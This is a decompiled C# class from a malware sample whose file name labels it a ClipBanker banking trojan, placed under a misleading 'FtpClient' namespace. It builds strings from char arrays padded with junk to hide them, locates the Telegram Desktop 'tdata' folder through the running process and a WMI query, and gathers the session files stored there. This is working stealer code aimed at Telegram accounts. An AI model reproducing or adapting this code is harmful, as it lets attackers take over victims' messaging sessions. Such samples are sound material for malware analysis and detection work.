// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Applications.TG
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Models.Info;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;

namespace FtpClient.Data.Applications
{
  public static class TG
  {
    private static string EnumData()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[41]
      {
        '\\',
        'T',
        'e',
        'l',
        'e',
        'S',
        'Y',
        'S',
        'T',
        'E',
        'M',
        'g',
        'r',
        'a',
        'm',
        ' ',
        'D',
        'e',
        's',
        'S',
        'Y',
        'S',
        'T',
        'E',
        'M',
        'k',
        't',
        'o',
        'p',
        '\\',
        't',
        'd',
        'S',
        'Y',
        'S',
        'T',
        'E',
        'M',
        'a',
        't',
        'a'
      }).Replace("SYSTEM", string.Empty);
      Process[] processesByName = Process.GetProcessesByName(new string(new char[12]
      {
        'T',
        'M',
        'E',
        'e',
        'l',
        'e',
        'g',
        'r',
        'M',
        'E',
        'a',
        'm'
      }).Replace("ME", string.Empty));
      if (!((IEnumerable<Process>) processesByName).Any<Process>())
        return str;
      return Path.Combine(new FileInfo(TG.PrcsEx(processesByName[0])).Directory.FullName, new string(new char[8]
      {
        't',
        'd',
        'C',
        'U',
        'Z',
        'a',
        't',
        'a'
      }).Replace("CUZ", string.Empty));
    }

    private static string PrcsEx(Process process)
    {
      try
      {
        foreach (ManagementObject managementObject in new ManagementObjectSearcher(new string(new char[51]
        {
          'S',
          'E',
          'L',
          'E',
          'C',
          'T',
          ' ',
          'E',
          'x',
          'e',
          'c',
          'u',
          't',
          'a',
          'b',
          'l',
          'e',
          'P',
          'a',
          't',
          'h',
          ',',
          ' ',
          'P',
          'r',
          'o',
          'c',
          'e',
          's',
          's',
          'I',
          'D',
          ' ',
          'F',
          'R',
          'O',
          'M',
          ' ',
          'W',
          'i',
          'n',
          '3',
          '2',
          '_',
          'P',
          'r',
          'o',
          'c',
          'e',
          's',
          's'
        })).Get())
        {
          object obj1 = managementObject[new string(new char[9]
          {
            'P',
            'r',
            'o',
            'c',
            'e',
            's',
            's',
            'I',
            'D'
          })];
          object obj2 = managementObject[new string(new char[14]
          {
            'E',
            'x',
            'e',
            'c',
            'u',
            't',
            'a',
            'b',
            'l',
            'e',
            'P',
            'a',
            't',
            'h'
          })];
          if (obj2 != null && obj1.ToString() == process.Id.ToString())
            return obj2.ToString();
        }
      }
      catch
      {
      }
      return "";
    }

    public static List<InfoClass3> GetFiles()
    {
      List<InfoClass3> files = new List<InfoClass3>();
      try
      {
        string path1 = TG.EnumData();
        string[] directories = Directory.GetDirectories(path1);
        foreach (string file in Directory.GetFiles(path1))
        {
          try
          {
            files.Add(new InfoClass3(file));
          }
          catch
          {
          }
        }
        foreach (string path2 in directories)
        {
          DirectoryInfo directoryInfo = new DirectoryInfo(path2);
          string name = directoryInfo.Name;
          if (name.Length == 16)
          {
            foreach (FileInfo enumerateFile in directoryInfo.EnumerateFiles())
            {
              try
              {
                files.Add(new InfoClass3(enumerateFile.FullName)
                {
                  Object4 = name
                });
              }
              catch
              {
              }
            }
          }
        }
      }
      catch (Exception ex)
      {
      }
      return files;
    }
  }
}
